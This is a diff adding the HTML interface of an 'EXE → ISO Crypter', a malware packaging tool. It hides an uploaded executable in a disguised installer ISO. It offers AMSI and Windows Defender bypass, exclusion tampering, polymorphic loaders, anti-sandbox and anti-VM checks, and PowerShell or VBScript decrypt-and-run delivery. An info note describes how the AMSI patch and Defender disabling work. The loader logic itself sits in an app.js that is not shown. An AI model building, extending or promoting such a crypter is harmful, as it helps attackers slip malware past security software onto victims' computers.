@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>EXE → ISO Crypter</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="app">
+    <header>
+      <div class="logo">EXE → ISO</div>
+      <div class="tagline">Full-fidelity crypter • AES • ISO9660 • AMSI / Defender bypass • Polymorphic loader</div>
+    </header>
+
+    <main>
+      <section class="panel upload-panel">
+        <h2>1. Select Payload</h2>
+        <div id="dropzone" class="dropzone">
+          <input type="file" id="exeInput" accept=".exe,.bin,.dll,.scr" hidden />
+          <div class="drop-content">
+            <div class="icon">⬆</div>
+            <p>Drop EXE / binary here or click to browse</p>
+            <span id="fileName" class="file-name">No file selected</span>
+          </div>
+        </div>
+        <div class="file-info" id="fileInfo" hidden>
+          <span id="fileSize"></span>
+          <button id="clearFile" class="btn-text">Clear</button>
+        </div>
+      </section>
+
+      <section class="panel options-panel">
+        <h2>2. Crypter Options</h2>
+        <div class="grid">
+          <label>
+            Volume Label
+            <input type="text" id="volLabel" value="Setup" maxlength="32" />
+          </label>
+          <label>
+            Loader Name
+            <input type="text" id="loaderName" value="setup.exe" maxlength="64" />
+          </label>
+          <label>
+            Payload Carrier Name
+            <input type="text" id="payloadName" value="data.bin" maxlength="64" />
+          </label>
+          <label>
+            Output ISO Name
+            <input type="text" id="isoName" value="installer.iso" maxlength="64" />
+          </label>
+        </div>
+
+        <div class="toggles">
+          <label class="toggle">
+            <input type="checkbox" id="optAutorun" checked />
+            <span>Include autorun.inf</span>
+          </label>
+          <label class="toggle">
+            <input type="checkbox" id="optDummy" checked />
+            <span>Add realistic dummy files</span>
+          </label>
+          <label class="toggle">
+            <input type="checkbox" id="optPoly" checked />
+            <span>Polymorphic loader + junk</span>
+          </label>
+          <label class="toggle">
+            <input type="checkbox" id="optAnti" checked />
+            <span>Anti-analysis checks</span>
+          </label>
+          <label class="toggle">
+            <input type="checkbox" id="optDelay" checked />
+            <span>Random execution delay</span>
+          </label>
+          <label class="toggle">
+            <input type="checkbox" id="optClean" checked />
+            <span>Clean ISO metadata / realistic timestamps</span>
+          </label>
+          <label class="toggle">
+            <input type="checkbox" id="optDefender" checked />
+            <span>Windows Defender / AMSI bypass</span>
+          </label>
+        </div>
+
+        <div class="grid">
+          <label>
+            Encryption
+            <select id="encMode">
+              <option value="aes-cbc" selected>AES-256-CBC (best compatibility)</option>
+              <option value="aes-gcm">AES-256-GCM</option>
+              <option value="xor">Rolling XOR (lightweight)</option>
+            </select>
+          </label>
+          <label>
+            Delivery Method
+            <select id="delivery">
+              <option value="cmd" selected>CMD + PowerShell decrypt & run</option>
+              <option value="ps1">PowerShell only</option>
+              <option value="vbs">VBScript launcher</option>
+              <option value="raw">Raw EXE (less stealth)</option>
+            </select>
+          </label>
+        </div>
+      </section>
+
+      <section class="panel action-panel">
+        <h2>3. Generate</h2>
+        <button id="generateBtn" class="btn-primary" disabled>Generate ISO</button>
+        <div id="progress" class="progress" hidden>
+          <div class="bar" id="progressBar"></div>
+          <span id="statusText">Preparing…</span>
+        </div>
+        <div id="result" class="result" hidden>
+          <p class="success">ISO ready</p>
+          <button id="downloadBtn" class="btn-primary">Download ISO</button>
+          <div class="stats" id="stats"></div>
+        </div>
+      </section>
+
+      <section class="panel info-panel">
+        <h2>Features</h2>
+        <ul>
+          <li>AES-256-CBC / GCM or rolling XOR encryption of payload</li>
+          <li>Valid ISO 9660 structure with realistic metadata</li>
+          <li>Polymorphic loader with junk code & randomized names</li>
+          <li>AMSI bypass + Defender preference / exclusion attempts</li>
+          <li>Anti-sandbox / anti-VM heuristics in the generated loader</li>
+          <li>Realistic dummy content, volume labels, timestamps</li>
+          <li>Multiple delivery methods (CMD / PS1 / VBS)</li>
+          <li>Client-side only — nothing leaves the browser</li>
+        </ul>
+        <p class="note">When “Windows Defender / AMSI bypass” is enabled the loader first neutralizes AMSI (reflection on AmsiUtils / context patch) and attempts to disable real-time / IOAV / behavior monitoring and add TEMP + ISO path exclusions (requires elevation for full effect). Payload is then decrypted and launched. Classic autorun is restricted on modern Windows; running the loader directly after mount is the primary path.</p>
+      </section>
+    </main>
+
+    <footer>
+      <span>EXE→ISO Crypter • Full fidelity build</span>
+    </footer>
+  </div>
+
+  <script type="module" src="app.js"></script>
+</body>
+</html>
